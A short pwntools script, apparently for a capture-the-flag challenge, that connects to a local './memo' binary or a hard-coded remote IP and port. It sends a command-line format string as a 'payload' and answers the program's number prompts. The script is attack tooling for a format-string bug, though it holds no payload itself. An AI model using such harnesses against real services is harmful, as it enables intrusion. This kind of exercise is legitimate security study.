#!/usr/bin/python

# (C) 2018 Gordon Engelke <reject@email.de>

import sys
from pwn import *

#context.log_level = 'debug'

if sys.argv[1] == "local":
  local = True
else:
  local = False

if not local:
  io = remote( "89.38.210.128", 31339 )
else:
  context.binary = './memo'
  io = process( "./memo" )

format_string = sys.argv[2]

print( io.recv() )
#log.info( "Sending format string (payload): " + format_string )
io.sendline( format_string )
print( io.recvuntil('What number was on the screen?'))
io.sendline( "42" )
print( io.recvuntil('What number was on the screen?'))
io.sendline( "77" )
print( io.recvuntil('What number was on the screen?'))
io.sendline( "111" )
print( io.recvuntil('Bye'))
